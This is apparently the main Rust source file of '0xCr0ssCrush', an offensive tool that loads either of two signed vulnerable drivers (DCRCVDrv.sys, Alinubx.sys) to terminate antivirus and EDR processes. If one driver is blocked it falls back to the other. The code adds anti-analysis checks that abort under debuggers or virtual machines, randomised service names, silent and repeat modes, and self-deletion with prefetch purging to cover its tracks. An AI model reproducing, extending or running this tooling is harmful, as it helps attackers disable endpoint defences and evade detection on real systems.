mod config;
mod drv;
mod loader;
mod obf;
mod ops;
mod targets;

use std::io::Write;
use std::sync::atomic::{AtomicBool, Ordering};
use std::{process, time::Duration};

use drv::Kind;

const EXIT_OK: i32 = 0;
const EXIT_NO_TARGET: i32 = 2;
const EXIT_DRIVER_FAIL: i32 = 3;
const EXIT_ENV: i32 = 5;

fn flush_and_exit(code: i32) -> ! {
    let _ = std::io::stdout().flush();
    process::exit(code);
}

struct Opts {
    silent: bool,
    repeat: bool,
    dry_run: bool,
    json: bool,
    list_mode: bool,
    version: bool,
    delay_ms: u64,
    jitter_ms: u64,
    max_attempts: u32,
    self_destruct: bool,
    skip_env_check: bool,
    no_fallback: bool,
    service_name: Option<String>,
    driver_path: Option<String>,
    cli_names: Option<String>,
    cli_config: Option<String>,
    driver_kind: Option<String>,
}

fn parse_args() -> Option<Opts> {
    let args: Vec<String> = std::env::args().collect();
    let mut o = Opts {
        silent: false, repeat: false, dry_run: false, json: false,
        list_mode: false, version: false, delay_ms: 0, jitter_ms: 0,
        max_attempts: 0, self_destruct: false, skip_env_check: false,
        no_fallback: false,
        service_name: None, driver_path: None, cli_names: None,
        cli_config: None, driver_kind: None,
    };
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-s" | "--silent" => o.silent = true,
            "-r" | "--repeat" => o.repeat = true,
            "-d" | "--dry-run" => o.dry_run = true,
            "-j" | "--json" => o.json = true,
            "-l" | "--list" => o.list_mode = true,
            "-v" | "--version" => o.version = true,
            "-x" | "--self-destruct" => o.self_destruct = true,
            "--no-check" => o.skip_env_check = true,
            "--no-fallback" => o.no_fallback = true,
            "--delay" => { i += 1; if i < args.len() { o.delay_ms = args[i].parse().unwrap_or(0); } }
            "--jitter" => { i += 1; if i < args.len() { o.jitter_ms = args[i].parse().unwrap_or(0); } }
            "--max-attempts" => { i += 1; if i < args.len() { o.max_attempts = args[i].parse().unwrap_or(0); } }
            "--svc" | "--service-name" => { i += 1; if i < args.len() { o.service_name = Some(args[i].clone()); } }
            "--driver" => { i += 1; if i < args.len() { o.driver_path = Some(args[i].clone()); } }
            "-k" | "--kind" => { i += 1; if i < args.len() { o.driver_kind = Some(args[i].clone()); } }
            "-n" | "--names" => { i += 1; if i < args.len() { o.cli_names = Some(args[i].clone()); } }
            "-c" | "--config" => { i += 1; if i < args.len() { o.cli_config = Some(args[i].clone()); } }
            "-h" | "--help" => { print_help(); return None; }
            _ => {}
        }
        i += 1;
    }
    Some(o)
}

fn print_help() {
    println!("0xCr0ssCrush - DCRCVDrv.sys + Alinubx.sys dual-driver EDR terminator");
    println!("Public PoCs for the two signed drivers abused by the");
    println!("Cruciferra MaaS loader to kill AV/EDR (eSentire TRU, Aug 2026).");
    println!();
    println!("usage: crosscrush.exe [options]");
    println!();
    println!("options:");
    println!("  -k, --kind <dcrc|alinubx>  which driver to use (default: auto)");
    println!("  -s, --silent               suppress all console output");
    println!("  -r, --repeat               keep running, re-check targets");
    println!("  -d, --dry-run              enumerate targets without killing");
    println!("  -j, --json                 machine-readable JSON output");
    println!("  -l, --list                 print target names and exit");
    println!("  -v, --version              print version and exit");
    println!("  -x, --self-destruct        delete self after success");
    println!("      --no-check             skip VM and debugger checks");
    println!("      --no-fallback          single-driver run (no twin swap)");
    println!("      --delay <ms>           sleep before executing");
    println!("      --jitter <ms>          randomize repeat interval");
    println!("      --max-attempts <n>     stop after n kill passes");
    println!("      --svc <name>           custom service name");
    println!("      --driver <path>        custom driver file path");
    println!("  -n, --names <csv>          comma-separated target list");
    println!("  -c, --config <path>        load targets from config file");
    println!("  -h, --help                 show this help");
    println!();
    println!("exit codes: 0 ok, 2 no targets, 3 driver failed, 5 environment");
}

fn main() {
    let opts = match parse_args() {
        Some(o) => o,
        None => return,
    };

    if opts.version {
        println!("0xCr0ssCrush v0.1.0");
        println!("DCRCVDrv.sys (0x2205C0) + Alinubx.sys (0x222024) kernel-process terminators");
        return;
    }

    if opts.silent {
        let _ = unsafe { ops::silence_std_handles() };
    }

    if opts.delay_ms > 0 {
        std::thread::sleep(Duration::from_millis(opts.delay_ms));
    }

    // Resolve which driver to drive: explicit -k wins, else auto-detect
    // by probing the device paths.
    // Preferred driver order. -k picks the first one we try, but the twins
    // always fall back: if DCRCVDrv.sys is blocked on disk (hash block, AV
    // policy, driver load refused) we drop Alinubx.sys and keep going.
    let preferred: Option<Kind>;
    if let Some(k) = &opts.driver_kind {
        preferred = match Kind::parse(k) {
            Some(k2) => Some(k2),
            None => {
                println!("error: unknown driver kind '{k}' (use dcrc or alinubx)");
                flush_and_exit(EXIT_DRIVER_FAIL);
            }
        };
    } else {
        preferred = None;
    }

    let names_str: Vec<String> = if let Some(n) = &opts.cli_names {
        config::parse_names_csv(n)
    } else if let Some(path) = &opts.cli_config {
        config::load_names_file(path).unwrap_or_default()
    } else {
        config::load_default_or(&targets::defaults())
    };

    if opts.list_mode {
        println!("targets: {}", names_str.len());
        for n in &names_str { println!("  {n}"); }
        return;
    }

    if names_str.is_empty() {
        println!("error: no target names specified");
        flush_and_exit(EXIT_NO_TARGET);
    }

    if !opts.skip_env_check {
        if ops::detect_debugger() || ops::detect_vm() {
            println!("aborted: analysis environment detected");
            flush_and_exit(EXIT_ENV);
        }
    }

    let mut order: Vec<Kind> = Kind::order();
    if opts.no_fallback {
        order = vec![preferred.unwrap_or(Kind::Dcrc)];
    } else if let Some(p) = preferred {
        // Move the requested driver to the front of the queue.
        let mut tmp: Vec<Kind> = Vec::new();
        for k in order {
            if k != p { tmp.push(k); }
        }
        tmp.insert(0, p);
        order = tmp;
    }

    // Try each driver in order: open the device first (maybe a leftover
    // instance is already running), otherwise install + start + open.
    // On failure we clean up whatever we created and move to the twin.
    let mut _drv_svc: Option<loader::DriverService> = None;
    let mut dev: Option<drv::CrossDev> = None;
    let mut kind: Kind = order[0];

    for k in order {
        println!("[*] trying driver: {}", match k {
            Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
            Kind::Alinubx => "alinubx (Alinubx.sys)",
        });
        match drv::CrossDev::open(k) {
            Ok(d) => {
                println!("[+] driver already loaded");
                dev = Some(d);
                kind = k;
                break;
            }
            Err(_) => {}
        }
        let drv_file = ops::resolve_driver_path(&opts.driver_path.clone().unwrap_or_else(|| k.driver_file()));
        let svc_name = opts.service_name.clone().unwrap_or_else(|| ops::random_service_name(k.svc_prefix().as_str()));
        if let Ok(s) = loader::DriverService::install(&svc_name, &drv_file) {
            if s.start().is_ok() {
                match drv::CrossDev::open(k) {
                    Ok(d) => {
                        println!("[+] driver loaded and device opened");
                        _drv_svc = Some(s);
                        dev = Some(d);
                        kind = k;
                        break;
                    }
                    Err(_) => {}
                }
            }
        }
        // This driver refused us - roll back and try the twin.
        // The DriverService handle cleans itself up (stop + delete) when
        // it goes out of scope at the end of this loop iteration.
        println!("[!] {} blocked or failed to load, falling back", match k {
            Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
            Kind::Alinubx => "alinubx (Alinubx.sys)",
        });
    }

    if dev.is_none() {
        println!("fatal: neither signed driver was usable (DCRCVDrv.sys + Alinubx.sys both blocked?)");
        flush_and_exit(EXIT_DRIVER_FAIL);
    }
    let dev = dev.unwrap();
    println!("[+] driver kind: {}", match kind {
        Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
        Kind::Alinubx => "alinubx (Alinubx.sys)",
    });

    if opts.dry_run {
        let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
        if opts.json {
            println!("{{\"mode\":\"dry-run\",\"targets\":[{}]}}", procs.iter().map(|(n, p)| format!("{{\"name\":\"{n}\",\"pid\":{p}}}")).collect::<Vec<_>>().join(","));
        } else {
            println!("dry-run: {} target(s) present", procs.len());
            for (n, p) in &procs { println!("  {n} ({p})"); }
        }
        drop(dev);
        flush_and_exit(if procs.is_empty() { EXIT_NO_TARGET } else { EXIT_OK });
    }

    let stop = AtomicBool::new(false);
    let mut attempt: u32 = 0;
    let mut total_killed = 0usize;

    loop {
        attempt += 1;
        let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
        let mut killed = 0usize;

        for (name, pid) in &procs {
            match dev.kill_pid(kind, *pid) {
                Ok(()) => {
                    killed += 1;
                    println!("(+) terminated {name} ({pid})");
                }
                Err(e) => {
                    println!("error: {name} ({pid}): {e}");
                }
            }
        }
        total_killed += killed;

        if !opts.repeat || (opts.max_attempts > 0 && attempt >= opts.max_attempts) { break; }
        ops::jitter_sleep(3000, opts.jitter_ms);
        if stop.load(Ordering::SeqCst) { break; }
    }

    if opts.self_destruct {
        if let Ok(exe) = std::env::current_exe() {
            ops::purge_prefetch();
            ops::self_destruct(&exe.to_string_lossy());
        }
    }

    drop(dev);
    flush_and_exit(if total_killed > 0 { EXIT_OK } else { EXIT_NO_TARGET });
}